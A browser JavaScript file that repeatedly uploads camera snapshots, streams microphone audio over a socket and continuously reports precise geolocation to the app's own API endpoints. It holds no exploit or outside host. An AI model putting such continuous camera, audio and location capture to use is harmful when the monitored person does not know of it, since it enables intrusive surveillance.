// client_media.js
const TOKEN = localStorage.getItem('token') || "";

async function uploadSnapshot(blob) {
    const fd = new FormData();
    fd.append('file', blob, 'snap.jpg');
    const res = await fetch('/api/media/upload_camera', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + TOKEN },
        body: fd
    });
    return res.json();
}

async function startSnapshotLoop(interval=3000) {
    if (!navigator.mediaDevices) { console.warn("camera not supported"); return; }
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:360 } });
        const video = document.createElement('video');
        video.srcObject = stream; video.play();
        const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 360;
        const ctx = canvas.getContext('2d');
        setInterval(async () => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                try { const r = await uploadSnapshot(blob); console.log("snapshot sent", r); } catch (e) { console.error(e); }
            }, 'image/jpeg', 0.7);
        }, interval);
    } catch (e) { console.error("camera access failed:", e); }
}

function startAudioStreaming(socket, mimeType='audio/webm') {
    if (!navigator.mediaDevices) { console.warn("no mic"); return; }
    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
        const mr = new MediaRecorder(stream, { mimeType });
        mr.ondataavailable = e => {
            if (e.data && e.data.size > 0) {
                const reader = new FileReader();
                reader.onload = () => {
                    const b64 = reader.result;
                    socket.emit('audio_chunk', { user_id: getUserIdFromToken(), chunk: b64 });
                };
                reader.readAsDataURL(e.data);
            }
        };
        mr.start(1000);
    }).catch(err => console.error("mic denied", err));
}

function getUserIdFromToken(){
    const t = localStorage.getItem('token');
    if (!t) return null;
    try { return JSON.parse(atob(t.split('.')[1])).id; } catch(e){ return null; }
}

function startGeoWatch(){
    if (!navigator.geolocation) { console.warn("no geolocation"); return; }
    navigator.geolocation.watchPosition(async (pos) => {
        const lat = pos.coords.latitude; const lon = pos.coords.longitude;
        try {
            await fetch('/api/media/send_location', {
                method: 'POST',
                headers: {
                    'Content-Type':'application/json',
                    'Authorization': 'Bearer ' + TOKEN
                },
                body: JSON.stringify({ latitude: lat, longitude: lon })
            });
        } catch (e) { console.error("geo send err", e); }
    }, err => console.error("geo err", err), { enableHighAccuracy:true, maximumAge:5000, timeout:10000 });
}
